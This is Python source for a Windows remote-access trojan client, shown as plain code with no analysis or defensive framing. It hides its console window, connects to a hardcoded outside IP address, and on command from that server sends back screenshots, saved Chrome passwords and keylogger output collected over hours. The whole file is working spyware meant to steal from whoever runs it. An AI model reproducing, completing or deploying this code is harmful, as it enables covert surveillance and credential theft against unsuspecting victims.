import socket
import signal
import sys
import threading, time
from Queue import Queue
import passwords, keylog
import base64
from PIL import ImageGrab
from packet import Packet

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

class Client:

    def __init__(self,ip='54.201.109.93',port=5715):
        self.messageQ = Queue()

        TCP_IP = ip
        TCP_PORT = port

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((TCP_IP, TCP_PORT))

    def run(self):

        threading.Thread(target=self.dequeue).start()

        while True:
            pkt = Packet()
            pkt.construct(self.s)
            if pkt.state:
                if pkt.state == "100":
                    print "hello"
                elif pkt.state == "143":
                    threading.Thread(target=self.screenshot,args=[pkt]).start()
                elif pkt.state == "144":
                    threading.Thread(target=self.passwords,args=[pkt]).start()
                elif pkt.state == "145":
                    threading.Thread(target=self.keylog,args=[pkt]).start()
                else:
                    print "i don't know that command"

    def screenshot(self,pkt):
        ImageGrab.grab().save("C:\Windows\System32\scrnsht.png", "png")
        f = open('C:\scrnsht.png', 'rb')
        fread = f.read()
        f.close()
        state = "143"
        size = str(len(fread))
        data = fread

        pkt.state = state
        pkt.data = data
        pkt.length = size

        self.enqueue(pkt)

    def keylog(self,pkt):
        import shutil
        path = "C:\Windows\System32\keylogs.txt"
        kl = keylog.keyLogger(path)
        threading.Thread(target=kl.run).start()
        for i in range(0,1440):
            time.sleep(60)
            k = open(path,"rb")
            state = "145"
            data = k.read()
            size = len(data)

            pkt.state = state
            pkt.data = data
            pkt.length = size

            self.enqueue(pkt)

    def encrypt(self,pkt):
        #TODO: Fill this in
        return

    def passwords(self,pkt):
        message = passwords.getChromePasswords()
        state = "144"
        data = "\n".join(message)
        size = len(data)

        pkt.state = state
        pkt.data = data
        pkt.length = size

        self.enqueue(pkt)

    def enqueue(self,pkt):
        self.messageQ.put(pkt)

    def dequeue(self):
        while True:
            pkt = self.messageQ.get()
            pkt.send(self.s)
            print "sent"

def main():
    c = Client()
    c.run()

if __name__ == '__main__':
    hide()
    #signal handlers
    signal.signal(signal.SIGINT, signal_handler)

    #run the program
    main()